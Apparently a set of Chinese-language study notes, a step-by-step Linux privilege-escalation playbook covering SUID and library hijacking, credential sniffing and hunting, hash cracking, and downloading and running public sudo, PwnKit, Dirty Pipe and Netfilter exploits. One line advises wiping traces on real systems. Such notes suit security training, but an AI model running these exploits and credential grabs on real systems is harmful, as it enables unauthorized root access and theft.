#### ④ 將 NFS 掛載到本地

```bash
sudo mount -t nfs <目標 IP>:<共享目錄> /mnt
```

例如：

```bash
sudo mount -t nfs 10.129.2.12:/tmp /mnt
```

👉 現在 `/mnt` 對應遠端 `/tmp`

***

#### ⑤ 上傳 SUID Shell 並設定權限

```bash
cp shell /mnt/
chmod u+s /mnt/shell
```

✅ 設定 suid bit（u+s）讓 shell 可以以 root 身份執行

***

#### ⑥ 回到受害主機低權限帳號

在目標機 `/tmp` 找到 `shell`：

```bash
ls -la /tmp/shell
```

應該看到：

```
-rwsr-xr-x 1 root root 16712 Sep  1 06:15 shell
```

✅ `rws` 代表 suid bit 已經設置好了

***

#### ⑦ 執行提權！

```bash
/tmp/shell
id
```

結果會是：

```
uid=0(root) gid=0(root) groups=0(root)
```

🎉 root get！

</details>

<details>

<summary>被動流量捕獲 (Passive Traffic Capture)</summary>

#### ① 用 tcpdump 開始抓封包

範例：監聽 eth0 介面並將流量存到檔案

```bash
tcpdump -i eth0 -w /tmp/capture.pcap
```

可以限定抓取 HTTP 流量 (port 80)tcpdump -i eth0 port 80 -w /tmp/http.pcap

⚠ 通常會讓它跑一段時間，等有人登入或傳輸敏感資料

***

#### ② 停止抓包

按 `Ctrl+C` 停止，封包會存到指定的 pcap 檔案中

***

#### ③ 在本機分析封包

***

**✅ 方法 A：使用 Wireshark (圖形化)**

* 把 `/tmp/capture.pcap` 拿到本機
* 開 Wireshark，過濾：

```
http.auth 或 ftp.request 或 smtp 或 telnet 或 pop3 或 imap
```

* 或用 `Follow TCP Stream` 查看明文帳密

***

**✅ 方法 B：使用 PCredz (自動提取憑證)**

下載 PCredz 工具：

```bash
git clone https://github.com/lgandx/PCredz.git
cd PCredz
```

分析封包：

```bash
python3 PCredz.py -f /tmp/capture.pcap
```

👉 它會自動列出明文密碼、Cookie、HTTP Basic Auth、SMTP/POP3/IMAP 密碼等

***

**✅ 方法 C：使用 net-creds**

```bash
git clone https://github.com/DanMcInerney/net-creds.git
cd net-creds
python3 net-creds.py -f /tmp/capture.pcap
```

👉 一樣可以自動分析 pcap 抓明文帳密

***

#### ④ 嘗試用抓到的帳密登入系統

* 登入 SSH / FTP
* 嘗試 sudo 提權
* 嘗試 SMB hash 破解

***

### ✅ 攻擊範例（範本）

```bash
tcpdump -i eth0 -w /tmp/capture.pcap
# 等 2 分鐘
Ctrl+C
scp /tmp/capture.pcap 回本機
python3 PCredz.py -f capture.pcap
# 找到 POP3 username:password，去登入目標系
```

</details>

<details>

<summary>Linux 核心漏洞 (Kernel Exploits) 權限提升</summary>

### ✅ 前置條件

* 你已經有低權限 shell
* 可以使用 `uname -a` 知道目標核心版本

***

### ✅ Step by step 實戰流程

***

#### ① 查看目標核心版本

```bash
uname -a
```

範例輸出：

```
Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 GNU/Linux
```

✅ 紀錄版本： `4.4.0-116-generic`

***

#### ② Google 搜尋

👉 使用 Google 搜尋：

```
linux 4.4.0-116-generic privilege escalation exploit
```

或

```
site:exploit-db.com 4.4.0-116
```

找到適用的 Exploit 程式碼（例如 Dirty Cow、或者專屬版本漏洞 PoC）。

***

#### ③ 將 exploit 上傳目標主機

如果主機有 wget 或 curl：

```bash
wget <exploit-url> -O kernel_exploit.c
```

或

```bash
curl -o kernel_exploit.c <exploit-url>
```

⚠ 如果不行，可以 SCP 或透過你的反向 shell 傳輸。

***

#### ④ 編譯漏洞程式

```bash
gcc kernel_exploit.c -o kernel_exploit
chmod +x kernel_exploit
```

⚠ 如果沒有 gcc，可以試著找預編譯版本或在同核心版本環境編譯後上傳。

***

#### ⑤ 執行 exploit

```bash
./kernel_exploit
```

正常會出現提示類似：

```
task_struct = ffff8800b71d7000
uidptr = ffff8800b95ce544
spawning root shell
```

此時已經有機會是 root shell！

***

#### ⑥ 確認身分

```bash
id
whoami
```

預期輸出：

```
uid=0(root) gid=0(root) groups=0(root)
```

🎉 成功提權為 root！

</details>

<details>

<summary>Shared Libraries  共享庫</summary>

### 🎯 攻擊前提條件：

1. 受害機器 sudo 設定中保留 `env_keep+=LD_PRELOAD`
2. 有一個 sudo 可執行的程式（不是 GTFOBins 也可以）
3. 目標 sudo 指令可以執行，且允許注入 preload

***

### 📜 攻擊流程：

#### ① 確認 sudo 權限及 LD\_PRELOAD 是否可利用

```bash
sudo -l
```

✅ 如果看到：

```
env_keep+=LD_PRELOAD
```

並且有類似：

```
(root) NOPASSWD: /usr/sbin/apache2 restart
```

代表此攻擊路徑可以嘗試！

***

#### ② 建立惡意共享函式庫

用以下內容建立 `root.c`：

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD"); 
    setgid(0); 
    setuid(0); 
    system("/bin/bash");
}
```

> `_init()` 函式會在共享庫被載入時自動執行。

***

#### ③ 將共享庫編譯成 so 檔

```bash
gcc -fPIC -shared -o /tmp/root.so root.c -nostartfiles
```

📌 小知識：

* `-fPIC` ：產生位置無關代碼
* `-shared` ：輸出為共享庫
* `-nostartfiles` ：不載入標準初始化代碼

***

#### ④ 開啟監聽（若要 reverse shell）或直接執行觸發

若是反彈 shell，可以準備 `nc`：

```bash
nc -lvnp 4444
```

如果只是要直接取得 root shell，直接進行下一步。

***

#### ⑤ 透過 sudo 搭配 LD\_PRELOAD 觸發權限提升

```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

🔎 這行指令會：

* 利用 sudo 執行 apache2
* 在執行時預先載入我們的 root.so
* 自動呼叫 `_init()`，取得 root shell

***

#### ⑥ 驗證是否為 root 權限

```bash
id
```

預期輸出：

```
uid=0(root) gid=0(root) groups=0(root)
```

🎉 你已經 root 了！

</details>

<details>

<summary>共享對象劫持 (Shared Object Hijacking)</summary>



### 📝 【1️⃣ 資訊收集】

#### ① 搜尋系統中有 SUID 權限的執行檔

```bash
find / -perm -4000 -type f 2>/dev/null
```

> 找出哪些程式擁有 root 權限執行。

***

#### ② 使用 `ldd` 查看目標 SUID 執行檔的動態函式庫依賴

```bash
ldd <binary>
```

範例：

```bash
ldd payroll
```

> 檢查是否有非標準路徑（例如 `/development/`）或自訂的 `libshared.so`。

***

#### ③ 確認 RUNPATH 或 RPATH

```bash
readelf -d <binary> | grep PATH
```

範例：

```bash
readelf -d payroll | grep PATH
```

> 找到可疑目錄（如果是 everyone writable 即為攻擊點）。

***

#### ④ 確認該路徑是否「可寫」

```bash
ls -ld /development/
```

> `drwxrwxrwx` 代表所有人可寫，非常危險！

***

### 🛠 【2️⃣ 攻擊步驟】

> 以下步驟與前面教學相同，我整合補全：

***

#### ① 找到執行檔及函式庫

```bash
ls -la payroll
ldd payroll
readelf -d payroll | grep PATH
```

***

#### ② 測試執行，找到缺少的函式 (symbol)

```bash
./payroll
```

通常會出現：

```
undefined symbol: dbquery
```

***

#### ③ 撰寫惡意函式庫 (libshared.so)

`exploit.c`：

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

***

#### ④ 編譯惡意共享函式庫

```bash
gcc -fPIC -shared -o /development/libshared.so exploit.c
```

***

#### ⑤ 執行 payload，觸發 root shell

```bash
./payroll
```

你應該會看到：

```
Malicious library loaded
# id
uid=0(root) gid=0(root) groups=0(root)
```

</details>

<details>

<summary>Python 函式庫劫持</summary>

### ✅ 1️⃣ 錯誤的寫入權限（Wrong Write Permissions）

> 當目標 Python 腳本以 root 或高權限執行，並且導入的模組有 world-writable 權限，我們可以直接修改該模組來注入惡意指令。

#### ➡️ 攻擊步驟

#### ① 確認有 SUID 權限的 Python 腳本

```bash
ls -l mem_status.py
```

輸出範例：

```
-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```

***

#### ② 檢查 Python 腳本內容

```bash
cat mem_status.py
```

範例內容：

```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
print(f"Available memory: {round(available_memory, 2)}%")
```

***

#### ③ 搜尋被匯入模組 `psutil` 的實際路徑

```bash
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
```

然後確認 `__init__.py` 的權限：

```bash
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

若結果顯示 world writable，如：

```
-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

✅ 可以被修改，代表存在漏洞！

***

#### ④ 編輯該模組，注入惡意指令

在 `virtual_memory()` 函式開頭加入：

```python
import os
os.system('id')
```

***

#### ⑤ 執行目標 Python 腳本

```bash
sudo /usr/bin/python3 ./mem_status.py
```

若看到輸出：

```
uid=0(root) gid=0(root) groups=0(root)
```

🎉 權限提升成功！

***

### ✅ 2️⃣ 利用 Library 路徑優先順序 (Library Path Hijacking)

#### ➡️ 攻擊條件

* 導入的模組位於 sys.path 中較低優先權目錄（如 `/usr/local/lib/...`）。
* sys.path 中較高優先權路徑可寫（如 `/usr/lib/python3.8/`）。

#### ➡️ 攻擊步驟

#### ① 檢查 Python 的模組搜尋順序

```bash
python3 -c 'import sys; print("\n".join(sys.path))'
```

***

#### ② 檢查 psutil 預設安裝位置

```bash
pip3 show psutil
```

輸出範例：

```
Location: /usr/local/lib/python3.8/dist-packages
```

若此路徑在 sys.path 裡較低順位，而 `/usr/lib/python3.8` 可寫，代表可以進行 hijacking。

***

#### ③ 確認目錄可寫權限

```bash
ls -ld /usr/lib/python3.8
```

若為：

```
drwxr-xrwx 30 root root  20480 Dec 14 16:26 /usr/lib/python3.8
```

✅ World writable，漏洞存在！

***

#### ④ 建立同名惡意模組

建立 `/usr/lib/python3.8/psutil.py`：

```python
#!/usr/bin/env python3
import os

def virtual_memory():
    os.system('id')
```

***

#### ⑤ 執行目標 Python 腳本

```bash
sudo /usr/bin/python3 ./mem_status.py
```

如果執行時出現：

```
uid=0(root) gid=0(root) groups=0(root)
```

🎉 劫持成功！

***

### ✅ 3️⃣ 利用 PYTHONPATH 環境變數 (PYTHONPATH Hijacking)

#### ➡️ 攻擊條件

* 有 sudo 權限可用 `SETENV` 執行 `python3`。
* 可自訂 PYTHONPATH 指向惡意模組所在目錄。

***

#### ➡️ 攻擊步驟

#### ① 檢查 sudo 權限

```bash
sudo -l
```

結果範例：

```
(ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

✅ 可以搭配環境變數執行 python3！

***

#### ② 在 `/tmp/` 建立惡意模組 `psutil.py`

內容如下：

```python
#!/usr/bin/env python3
import os

def virtual_memory():
    os.system('id')
```

***

#### ③ 使用 PYTHONPATH 執行

```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```

如果輸出結果顯示：

```
uid=0(root) gid=0(root) groups=0(root)
```

🎉 PYTHONPATH 劫持成功！

***

### ✅ 完整整理表格 (一眼看懂)

| 攻擊方式                   | 核心條件                                    | 攻擊流程重點                                     |
| ---------------------- | --------------------------------------- | ------------------------------------------ |
| 錯誤寫入權限 (Wrong Write)   | 目標腳本以 root 執行 & 匯入模組有 world writable 權限 | 修改該模組，在函式開頭插入 os.system(‘id’)，執行觸發         |
| Library Path Hijacking | sys.path 高優先權路徑可寫，低順位路徑存在目標模組           | 在高優先權目錄中放置同名惡意模組，覆蓋原本模組                    |
| PYTHONPATH 環境變數劫持      | sudo 可使用 `SETENV` 選項執行 python3          | 自訂 `PYTHONPATH` 指向 /tmp/ 下惡意模組，sudo 執行目標程式 |

</details>

<details>

<summary>🎯 Linux 憑證獵取</summary>





## 🧨 A. Files 類憑證搜尋

### 🔍 1. 設定檔（config）

```bash
for ext in .conf .config .cnf; do
  echo "[*] Searching $ext"
  find / -name "*$ext" 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done
```

🔎 搜尋內容中的關鍵詞：

```bash
for f in $(find / -name "*.cnf" 2>/dev/null); do
  echo "[*] Checking $f"; grep -i "user\|pass" $f 2>/dev/null
done
```

***

### 🔍 2. 資料庫檔案

```bash
for ext in .sql .db .*db .db*; do
  echo "[*] Searching $ext"
  find / -name "*$ext" 2>/dev/null | grep -v "doc\|lib\|share"
done
```

看重點：`cert9.db` 和 `key4.db` → Firefox 儲存的登入資訊

***

### 🔍 3. Notes 筆記檔

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

這會找出所有 `.txt` 和「沒有副檔名」的筆記檔，內文往往藏密碼。

***

### 🔍 4. Scripts 腳本檔

```bash
for ext in .sh .py .pl .go .jar .c; do
  echo "[*] Searching $ext"
  find / -name "*$ext" 2>/dev/null | grep -v "doc\|lib\|headers\|share"
done
```

重點：檢查腳本是否包含 hardcoded 密碼

***

### 🔍 5. CronJobs 排程

```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
```

這些定時任務的腳本中可能 hardcode 密碼、API key。

***

### 🔍 6. SSH 金鑰

```bash
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

🔑 私鑰開頭通常是 `-----BEGIN OPENSSH PRIVATE KEY-----`\
🔓 若未加密可直接用來連線！

***

## 🔁 B. History 類憑證搜尋

### 🔍 Bash 歷史記錄

```bash
tail -n 20 /home/*/.bash_history
cat /home/*/.bashrc
cat /home/*/.bash_profile
```

看是否執行過 `su`、腳本參數帶密碼，或 curl/post 提交密碼。

***

## 💾 C. Memory & 快取類

### 🔧 Mimipenguin 提取記憶體中的登入密碼

```bash
sudo python3 mimipenguin.py
# or
sudo bash mimipenguin.sh
```

✅ 會回傳格式：

```
[SYSTEM - GNOME] cry0l1t3:MySecretPass
```

***

### 🔧 LaZagne（支援超過 30 種工具憑證）

```bash
sudo python2.7 laZagne.py all
```

🎯 支援項目包括：

* Shadow / passwd
* GNOME keyring / Kwallet
* SSH / Git / AWS / Docker
* Firefox, Chromium, Filezilla, etc

***

### 🔓 Firefox 解密瀏覽器登入

```bash
cat ~/.mozilla/firefox/*.default*/logins.json | jq .
```

🔧 用 firefox-decrypt.py 解密：

```bash
python3.9 firefox_decrypt.py
```

輸出範例：

```
Website: https://target.com
Username: admin
Password: P@ssw0rd123
```

***

## 📚 D. 日誌紀錄中的痕跡

### 🔍 有用的日誌檔：

```
/var/log/auth.log     # Debian 驗證
/var/log/secure       # RedHat 驗證
/var/log/syslog       # 系統活動
/var/log/cron         # 定時腳本
/var/log/faillog      # 登入失敗
```

### 🔍 搜尋關鍵字：

```bash
for f in /var/log/*; do
  grep -Ei "accepted|session opened|sudo|password changed|COMMAND=" $f 2>/dev/null
done
```

</details>

<details>

<summary>Linux 憑證系統與破解 (to be edit ...)</summary>

## 🔐 Linux 憑證系統與破解攻略

***

### 📘 一、認識三大密碼檔案

| 檔案                      | 說明                          |
| ----------------------- | --------------------------- |
| `/etc/passwd`           | 所有使用者帳號基本資料，可被所有人讀取         |
| `/etc/shadow`           | 密碼雜湊資訊（加密密碼），**只有 root 可讀** |
| `/etc/security/opasswd` | 過往使用過的舊密碼雜湊，用於 PAM 防止重複使用   |

***

### 📂 `/etc/passwd` 格式說明

範例：

```
cry0l1t3:x:1000:1000:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
```

| 欄位順序 | 說明                   |
| ---- | -------------------- |
| 1    | 使用者名稱                |
| 2    | 密碼資訊（x 代表存放在 shadow） |
| 3    | UID（使用者 ID）          |
| 4    | GID（群組 ID）           |
| 5    | 使用者全名 / 備註           |
| 6    | 使用者家目錄               |
| 7    | shell（登入使用的殼）        |

***

### ⚠️ 特別注意：

* 若密碼欄位是 `x` → 使用 `/etc/shadow`
* 若密碼欄位是空白或 `::` → 無需密碼登入（**重大安全漏洞**）
* 若誤設寫入權限 → 可自行刪除 root 密碼達成提權

**範例提權技巧：**

```bash
sudo nano /etc/passwd
# 將 root:x: 改為 root:: 即可空密碼登入 root
su
# 進入 root 無需密碼
```

***

### 🧱 `/etc/shadow` 格式說明

範例：

```
cry0l1t3:$6$wBRzy$...HASH...:18937:0:99999:7:::
```

| 欄位順序 | 說明                       |
| ---- | ------------------------ |
| 1    | 使用者名稱                    |
| 2    | 密碼雜湊（或 `*`、`!` 表示無法密碼登入） |
| 3    | 上次密碼修改時間（從 1970 年起的天數）   |
| 4\~9 | 密碼策略設定（最小、最大使用時間等）       |

***

### 🔐 雜湊格式解析（Field 2）

格式：

```
$<type>$<salt>$<hashed_password>
```

常見加密演算法：

| 標記     | 加密方式                 |
| ------ | -------------------- |
| `$1$`  | MD5                  |
| `$2a$` | Blowfish             |
| `$5$`  | SHA-256              |
| `$6$`  | **SHA-512**（大多數新版預設） |

***

### 🗝 `/etc/security/opasswd`（舊密碼紀錄）

* PAM 模組 `pam_unix.so` 會儲存舊密碼防止重複使用
* 檔案格式通常為：

```
username:UID:count:$1$HASH1,$1$HASH2,...
```

* 比如：

```bash
sudo cat /etc/security/opasswd
cry0l1t3:1000:2:$1$HjFAfYTG$abc123,$1$kcUjWZJX$def456
```

✅ 可從這裡挖到舊密碼 hash，特別是 **$1$ → MD5 很好破解**

***

### 🧨 破解流程（清晰步驟）

#### ✅ 第一步：備份檔案

```bash
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
```

#### ✅ 第二步：解除 Shadow 合併

```bash
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

***

### 🔥 使用 Hashcat 破解密碼

#### 🧠 破解 Linux 雜湊（SHA-512）

```bash
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o cracked.txt
```

參數說明：

* `-m 1800`：表示 SHA-512 (`$6$`)
* `-a 0`：字典攻擊
* `rockyou.txt`：常用密碼字典

***

#### 🧠 破解 Opasswd 中的 MD5 密碼

先建立 MD5 hash 清單：

```bash
cat > md5-hashes.list << EOF
qNDkF0zJ3v8ylCOrKB0kt0
E9uMSmiQeRh4pAAgzuvkq1
EOF
```

破解：

```bash
hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```

參數說明：

* `-m 500`：表示 Linux MD5 (`$1$`)

***

### ✅ 破解成功後可見：

```
qNDkF0zJ3v8ylCOrKB0kt0:password123
```

***

### 🛠 若無 Hashcat，可用 John the Ripper：

```bash
john --wordlist=rockyou.txt /tmp/unshadowed.hashes
```

查看已破解：

```bash
john --show /tmp/unshadowed.hashes
```

***

###

</details>









***

## **🎯 3. ZERO day**&#x20;

<details>

<summary>(CVE-2021-3156) ,(CVE-2019-14287)  (sudo)</summary>

| CVE-2021-3156 | sudo < 1.9.5p2 且系統為易受影響版本 | 利用公開 POC，下載編譯 `sudo-hax-me-a-sandwich`，執行指定 ID 即 root |
| ------------- | ------------------------- | ----------------------------------------------------- |

| CVE-2019-14287 | sudoers 允許特定指令，透過 sudo -u 指定 ID | 執行 `sudo -u#-1 指令`，利用 -1 映射為 root (UID 0) |
| -------------- | ------------------------------- | ----------------------------------------- |

### ✅ 1️⃣ CVE-2021-3156 (Heap-based Buffer Overflow)

> 影響 sudo 版本 < 1.9.5p2，大多數 Linux 發行版本在多年來都存在此漏洞。

#### ➡️ 攻擊流程

#### ① 確認 sudo 版本

```bash
sudo -V | head -n1
```

若結果為：

```
Sudo version 1.8.31
```

並且系統版本對應 Ubuntu 20.04 或其他受影響版本，即可進行下一步。

***

#### ② 確認作業系統版本

```bash
cat /etc/lsb-release
```

範例結果：

```
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
```

***

#### ③ 下載 exploit

```bash
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
```

***

#### ④ 執行 exploit

```bash
./sudo-hax-me-a-sandwich
```

確認目標系統編號 (如 `1` 為 Ubuntu 20.04.1)

***

#### ⑤ 執行指定版本 ID

```bash
./sudo-hax-me-a-sandwich 1
```

正常會看到：

```
** pray for your rootshell.. **

# id
uid=0(root) gid=0(root) groups=0(root)
```

🎉 root 權限成功！

***

### ✅ 2️⃣ CVE-2019-14287 (Sudo Policy Bypass)

> 當 sudo 設定允許執行特定指令時，即使只執行 `sudo -u#-1` 也可以拿到 root 權限。

#### ➡️ 攻擊流程

#### ① 查看 sudo 權限

```bash
sudo -l
```

若有類似：

```
User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```

代表可執行 `id` 指令。

***

#### ② 檢查使用者 UID

```bash
cat /etc/passwd | grep cry0l1t3
```

範例結果：

```
cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
```

✅ 知道自己 UID 是 1005。

***

#### ③ 利用 sudo -u#-1 觸發 root 權限

```bash
sudo -u#-1 id
```

會回傳：

```
uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```

然後就可以：

```bash
sudo -u#-1 /bin/bash
```

取得 root shell！

***

###

</details>

<details>

<summary>Polkit  波爾基特 (CVE-2021-4034 )/ PwnKi</summary>

### ✅ Polkit 簡介

* Polkit 是 Linux 系統用來授權不同使用者或應用程式以 root 權限執行操作的授權服務。
* `pkexec` 指令就像 sudo，可以用來以 root 或其他使用者身份執行指令。

***

### ✅ 漏洞背景（CVE-2021-4034）

* 此漏洞存在於 `pkexec` 工具中，是一個記憶體損毀 (Memory corruption) 弱點。
* 利用此漏洞可以在系統上以非特權使用者取得 root 權限。
* 該漏洞隱藏長達 12 年，2022 年初正式公開，編號 CVE-2021-4034（PwnKit）。

***

### ✅ 環境確認步驟

#### ① 檢查系統是否安裝有 pkexec：

```bash
which pkexec
```

#### ② 確認 polkit 版本（可選）：

```bash
pkexec --version
```

若版本較舊（通常 < 0.120）都可能受影響。

***

### ✅ Exploit 利用步驟

#### 1️⃣ 下載 Exploit PoC

```bash
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
```

> 如果沒有 git，可以嘗試 wget 或 curl。

***

#### 2️⃣ 編譯 POC

```bash
gcc cve-2021-4034-poc.c -o poc
```

✅ 如果沒裝 gcc，可以先確認是否能用 `sudo apt install gcc` 安裝，或嘗試透過其他管道上傳已編譯好的二進制。

***

#### 3️⃣ 執行 Exploit

```bash
./poc
```

⚠️ 成功執行後會直接進入 root shell，但初始是 `/bin/sh`，可以執行：

```bash
bash
```

切換成 bash shell。

***

#### 4️⃣ 驗證 root 權限

```bash
id
```

預期輸出：

```
uid=0(root) gid=0(root) groups=0(root)
```

🎉 成功取得 root！

***

### ✅ 小總結：

| 利用點                    | 條件                           | 步驟                                             |
| ---------------------- | ---------------------------- | ---------------------------------------------- |
| CVE-2021-4034 (PwnKit) | 系統有 `pkexec`，版本未修補，通常 <0.120 | 下載 POC → 編譯 → 執行 `./poc` → 切 bash → id 查看 root |

</details>

<details>

<summary>Dirty Pipe (CVE-2022-0847)</summary>

### ✅ Dirty Pipe 簡介

Dirty Pipe 係 Linux 核心 5.8 \~ 5.17 之間一個重大漏洞，允許非特權用戶寫入有 read 權限但冇寫權限嘅檔案（例如 `/etc/passwd`），從而達到權限提升 (root)。

***

### ✅ 利用條件：

* Linux kernel 版本 5.8 \~ 5.17。
* 目標系統可執行 `git`、`gcc` 或有辦法上傳已編譯的 exploit。
* 有 `read` 權限嘅目標檔案（例如 `/etc/passwd`）。

***

### ✅ 利用 Dirty Pipe 權限提升 step by step

#### 1️⃣ 確認 Kernel 版本

```bash
uname -r
```

如果版本係 5.8 到 5.17 之間，即有機會存在漏洞。

***

#### 2️⃣ 下載 Dirty Pipe PoC Exploit

```bash
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
```

***

#### 3️⃣ 編譯 Exploit

```bash
bash compile.sh
```

完成之後會產生：

* `exploit-1`
* `exploit-2`

***

#### 4️⃣ 使用 exploit-1 修改 `/etc/passwd`

> Exploit-1 會備份 `/etc/passwd`，修改 root 密碼成「piped」，再 restore。\
> 執行：

```bash
./exploit-1
```

成功後會提示可以用 su -c 指令直接取得 root。\
驗證：

```bash
id
```

預期結果：

```
uid=0(root) gid=0(root) groups=0(root)
```

🎉 已經成功 pop root shell！

***

#### 5️⃣ 使用 exploit-2 劫持 SUID Binary

exploit-2 可以利用 Dirty Pipe 臨時劫持指定嘅 SUID binary 以 root 權限執行。

***

**5-1️⃣ 找到 SUID binary**

```bash
find / -perm -4000 2>/dev/null
```

常見可利用目標：`/usr/bin/sudo`、`/usr/bin/passwd`、`/usr/bin/chsh` 等等。

***

**5-2️⃣ 使用 exploit-2 指定 SUID binary**

例如使用 `/usr/bin/sudo`：

```bash
./exploit-2 /usr/bin/sudo
```

執行後會顯示類似：

```
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
```

驗證 root 權限：

```bash
id
```

結果：

```
uid=0(root) gid=0(root) groups=0(root)
```

***

### ✅ 利用完成後記得：

* 恢復 `/etc/passwd`（exploit 已自動備份）。
* 刪除 `/tmp/sh` 臨時文件。
* 如果係 CTF 環境或測試機唔需要處理，但真實環境需要清理痕跡。

***

### ✅ 小結

| Exploit   | 功能                                            | 用法範例                        |
| --------- | --------------------------------------------- | --------------------------- |
| exploit-1 | 修改 `/etc/passwd` root 密碼為 piped，彈出 root shell | `./exploit-1`               |
| exploit-2 | 臨時劫持指定 SUID binary 執行 root shell              | `./exploit-2 /usr/bin/sudo` |

</details>

<details>

<summary>Netfilter 權限提升漏洞 (CVE-2021-22555、CVE-2022-25636、CVE-2023-32233)</summary>

### ✅ 什麼係 Netfilter？

Netfilter 係 Linux 核心中負責封包過濾、NAT 及流量控制嘅模組，透過 iptables、nftables 等機制運作。\
而由於 Netfilter 在核心層處理封包，歷年嚟多次發現可導致本地用戶提權到 root 嘅漏洞。

***

### ✅ 1️⃣ CVE-2021-22555 (Linux 2.6 \~ 5.11)

#### 利用步驟：

1️⃣ 確認 kernel 版本

```bash
uname -r
```

✅ 如果係 5.11 以下就有可能中招。

2️⃣ 下載漏洞 PoC

```bash
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
```

3️⃣ 編譯

```bash
gcc -m32 -static exploit.c -o exploit
```

4️⃣ 執行

```bash
./exploit
```

5️⃣ 成功會彈出 root shell：

```bash
id
```

結果：

```
uid=0(root) gid=0(root) groups=0(root)
```

***

### ✅ 2️⃣ CVE-2022-25636 (Linux 5.4 \~ 5.6.10)

#### 利用步驟：

1️⃣ 確認 kernel 版本

```bash
uname -r
```

✅ 如果係 5.4 \~ 5.6.10 之間即有機會中招。

2️⃣ 下載 exploit

```bash
git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
```

3️⃣ 編譯

```bash
make
```

4️⃣ 執行

```bash
./exploit
```

5️⃣ 成功彈出 root shell 後驗證：

```bash
id
```

結果：

```
uid=0(root) gid=0(root) groups=0(root)
```

⚠ 注意：此 exploit 有機會令系統 kernel crash，實機請小心測試！

***

### ✅ 3️⃣ CVE-2023-32233 (Linux 最高到 6.3.1)

#### 原理：

* 利用 nf\_tables 中匿名 sets 嘅 Use-After-Free 漏洞，通過 race condition 攻擊提權。

#### 利用步驟：

1️⃣ 下載 exploit

```bash
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
```

2️⃣ 編譯

```bash
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
```

3️⃣ 執行

```bash
./exploit
```

4️⃣ 成功後會自動彈出 root shell：

```bash
id
```

結果：

```
uid=0(root) gid=0(root) groups=0(root)
```

***

### ✅ 小結整理表

| CVE            | 受影響版本                | 利用方式                  | 注意事項              |
| -------------- | -------------------- | --------------------- | ----------------- |
| CVE-2021-22555 | Kernel 2.6 \~ 5.11   | OOB write + namespace | 穩定度較高             |
| CVE-2022-25636 | Kernel 5.4 \~ 5.6.10 | Heap out-of-bounds    | 可能造成 kernel panic |
| CVE-2023-32233 | Kernel ≤ 6.3.1       | nf\_tables UAF + race | 較複雜，易影響系統穩定性      |

</details>



***

### **🔗 5. 連鎖漏洞**



